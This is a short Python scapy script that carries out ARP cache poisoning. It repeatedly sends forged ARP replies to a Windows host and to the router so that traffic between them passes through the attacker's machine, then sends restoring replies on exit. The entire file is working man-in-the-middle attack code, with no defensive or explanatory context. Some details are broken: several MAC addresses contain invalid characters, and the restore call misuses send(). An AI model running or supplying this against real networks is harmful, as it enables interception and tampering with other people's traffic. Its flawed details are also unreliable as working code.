from scapy.all import *
import time

try:
    while True:
        #fake arp answer packet for target (windows)
        arp_reply_target=ARP(op=2,pdst="192.168.1.105",psrc="192.168.1.1",hwdst="18:00:57:e2:57:39",hwsrc="35:7c:ff:f3:38:fe")
        #fake arp answer  packet for router 
        arp_reply_target_router=ARP(op=2,pdst="192.168.1.1",psrc="192.168.1.105",hwdst="e8:y8:hh:14:09:4d",hwsrc="35:7c:ff:f3:38:fe")
        send(arp_reply_target)
        send(arp_reply_target_router)
        #print(arp_reply_target.show())
        time.sleep(2)
except KeyboardInterrupt as err:
    #real arp packet for target
    arp_reply_target_real=ARP(op=2,pdst="192.168.1.105",psrc="192.168.1.1",hwdst="18:00:57:e2:57:39",hwsrc="e8:y8:hh:14:09:4d")
    #real arp packet for router
    arp_reply_target_router_real=ARP(op=2,pdst="192.168.1.1",psrc="192.168.1.105",hwdst="e8:y8:hh:14:09:4d",hwsrc="18:hh:57:e2:57:39")
    send(arp_reply_target_real,arp_reply_target_router_real)
    print("")
    print("Exit")
